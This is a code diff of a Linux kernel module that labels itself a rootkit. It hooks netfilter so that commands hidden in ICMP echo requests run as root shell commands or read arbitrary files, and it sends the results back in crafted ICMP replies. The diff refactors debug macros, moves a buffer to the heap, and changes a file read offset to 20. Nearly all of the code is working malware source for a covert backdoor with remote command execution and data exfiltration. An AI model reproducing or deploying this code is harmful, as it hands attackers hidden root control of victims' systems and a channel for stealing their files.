@@ -12,9 +12,11 @@
 #define DEBUG
 
 #ifdef DEBUG
-#define DEBUG_PRINT(format, ...) printk(KERN_INFO format, __VA_ARGS__);
+#define DEBUG_PRINTF(format, ...) printk(KERN_INFO format, __VA_ARGS__);
+#define DEBUG_PUTS(string) printk(KERN_INFO string);
 #else
-#define DEBUG_PRINT(format, ...) 
+#define DEBUG_PRINTF(format, ...) 
+#define DEBUG_PUTS(string)
 #endif
 
 
@@ -84,7 +86,7 @@ static int __init startup(void)
     nfho.priority = NF_IP_PRI_FIRST;
     nf_register_net_hook(&init_net, &nfho);
     
-    DEBUG_PRINT("rootkit: start\n", "")
+    DEBUG_PUTS("rootkit: start\n")
 
     return 0;
 }
@@ -93,7 +95,7 @@ static void __exit cleanup(void)
 {
     // unregistering the hook after module was removed
     nf_unregister_net_hook(&init_net, &nfho);
-    DEBUG_PRINT("rootkit: finished\n", "")
+    DEBUG_PUTS("rootkit: finished\n")
 }
 
 
@@ -107,7 +109,7 @@ static void run_shell_command(char* bash_command) {
     char *argv[] = {"/bin/sh", "-c", bash_command, NULL};
     char *envp[] = {"PATH=/bin:/sbin", NULL};
 
-    DEBUG_PRINT("rootkit: performing bash command\n", "")
+    DEBUG_PUTS("rootkit: performing bash command\n")
 
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
@@ -116,7 +118,7 @@ static void run_shell_command(char* bash_command) {
 static int read_file(char* filename, char* buffer, int to_read) {
     struct file *f;
     int i;
-    loff_t offset = 0;
+    loff_t offset = 20;
 
     // initializing string with null symbols
     for (i = 0; i < to_read + 1; i++) {
@@ -127,7 +129,7 @@ static int read_file(char* filename, char* buffer, int to_read) {
     f = filp_open(filename, O_RDONLY, 0);
 
     if (IS_ERR(f)) {
-        DEBUG_PRINT("rootkit: file was not open\n", "")
+        DEBUG_PUTS("rootkit: file was not open\n")
         return -1;
     }
 
@@ -135,7 +137,7 @@ static int read_file(char* filename, char* buffer, int to_read) {
     kernel_read(f, (void*) buffer, to_read, &offset);
 
 
-    DEBUG_PRINT("rootkit: file was read: %s\n", buffer)
+    DEBUG_PRINTF("rootkit: file was read: %s\n", buffer)
 
     filp_close(f, NULL);
     
@@ -199,11 +201,11 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     struct ethhdr* new_eth;
 
 
-    DEBUG_PRINT("rootkit: 1\n", "")
+    DEBUG_PUTS("rootkit: 1\n")
     // allocation memort for 3 headers + payload
     skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);
 
-    DEBUG_PRINT("rootkit: 2\n", "")
+    DEBUG_PUTS("rootkit: 2\n")
 
     // reserving size for headers
     skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);
@@ -228,7 +230,7 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     saddr_copy = new_iph->saddr;
     new_iph->saddr = new_iph->daddr;
     new_iph->daddr = saddr_copy;
-    DEBUG_PRINT("rootkit: 3\n", "")
+    DEBUG_PUTS("rootkit: 3\n")
 
     // configuring the socket
     skb->dev = dev;
@@ -248,7 +250,7 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     // adding the packet to transmit queue
     ret = dev_queue_xmit(skb);
 
-    DEBUG_PRINT("rootkit: ret: %d\n", ret)
+    DEBUG_PRINTF("rootkit: ret: %d\n", ret)
     
 
     return ret;
@@ -275,28 +277,30 @@ static void rootkit_handler(struct work_struct* work) {
     // getting passed args struct
     args_t* args = container_of(work, args_t, work);
 
-    char buffer[CAT_BUFFER_SIZE + 1];
+    char* buffer;//[CAT_BUFFER_SIZE + 1];
 
     command_t command = parse_command(args->string);
 
     switch (command) {
         case RUN:
-            DEBUG_PRINT("rootkit: shell command: %s \n", args->string)
+            DEBUG_PRINTF("rootkit: shell command: %s \n", args->string)
             run_shell_command(args->string);
             send_response("rootkit: command was performed\0", args);
             break;
         case CAT:
-            DEBUG_PRINT("rootkit: cat command: %s \n", args->string);
+            DEBUG_PRINTF("rootkit: cat command: %s \n", args->string);
+            buffer = kmalloc(CAT_BUFFER_SIZE + 1, GFP_KERNEL);
             // checking errors
             if (read_file(args->string, buffer, CAT_BUFFER_SIZE) == 0) {   
                 send_response(buffer, args);
             } else {
                 send_response("rootkit: error while reading\0", args);
             }
+            kfree(buffer);
             
             break;
         default:
-            DEBUG_PRINT("rootkit: invalid command\n", "")
+            DEBUG_PUTS("rootkit: invalid command\n")
             send_response("rootkit: invallid command\0", args);
             break;
     }
@@ -328,19 +332,19 @@ static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struc
     icmph = icmp_hdr(skb);
 
 
-    DEBUG_PRINT("rootkit: ckecking connection\n", "")
+    DEBUG_PUTS("rootkit: ckecking connection\n")
 
 
     if (iph->protocol != IPPROTO_ICMP) {
-        DEBUG_PRINT("rootkit: bad protocol\n", "")
+        DEBUG_PUTS("rootkit: bad protocol\n")
         return NF_ACCEPT;
     }
     if (icmph->type != ICMP_ECHO) {
-        DEBUG_PRINT("rootkit: bad request type\n", "")
+        DEBUG_PUTS("rootkit: bad request type\n")
         return NF_ACCEPT;
     }
 
-    DEBUG_PRINT("rootkit: parsing command\n", "")
+    DEBUG_PUTS("rootkit: parsing command\n")
 
     args = kmalloc(sizeof(args_t), GFP_KERNEL);
 
@@ -369,7 +373,7 @@ static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struc
     args->iph = iph;
     args->skb = skb;
 
-    DEBUG_PRINT("rootkit: scheduling rootkit action \n", "")
+    DEBUG_PUTS("rootkit: scheduling rootkit action \n")
     INIT_WORK(&args->work, rootkit_handler);
     schedule_work(&args->work);
 
